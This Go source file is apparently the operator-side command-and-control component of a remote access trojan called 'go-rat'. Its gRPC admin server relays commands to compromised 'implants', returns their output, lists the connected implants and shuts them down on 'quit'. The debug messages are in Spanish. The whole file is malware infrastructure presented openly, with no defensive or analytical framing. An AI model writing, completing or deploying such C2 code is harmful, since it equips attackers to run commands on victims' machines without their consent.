package main

import (
	"context"
	"errors"
	_ "net/http/pprof"

	"github.com/google/uuid"
	"github.com/iortego42/go-rat/grpcapi"
)

type adminServer struct {
	implants map[uuid.UUID][]uuid.UUID
	grpcapi.AdminServer
}

func newAdminServer() *adminServer {
	s := new(adminServer)
	return s
}

func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	id, err := uuid.Parse(command.Id)
	if err != nil {
		return nil, err
	}
	if implants[id] == nil {
		return nil, errors.New("cant run command, no such id")
	}
	if command.In == "quit" {
		close(implants[id].in)
		close(implants[id].out)
		delete(implants, id)
		logger.Debug("Implant Cerrado", "implants", implants)
		return nil, errors.New("implant closed")
	}
	go func() {
		implants[id].in <- command
	}()
	logger.Debug("Enviado comando al Servidor.", "CMD", command.In)
	res = <-implants[id].out
	logger.Debug("Resultado recibido.")
	return res, nil
}

func (s *adminServer) GetImplants(ctx context.Context, _ *grpcapi.Empty) (*grpcapi.Implants, error) {
	i := &grpcapi.Implants{
		Implants: []*grpcapi.Identity{},
	}
	for k := range implants {
		// fmt.Println("key", k, "value", v)
		id := &grpcapi.Identity{Id: k.String()}
		// logger.Debug(id)
		i.Implants = append(i.Implants, id)

	}
	// logger.Debug(i.Implants)
	return i, nil
}
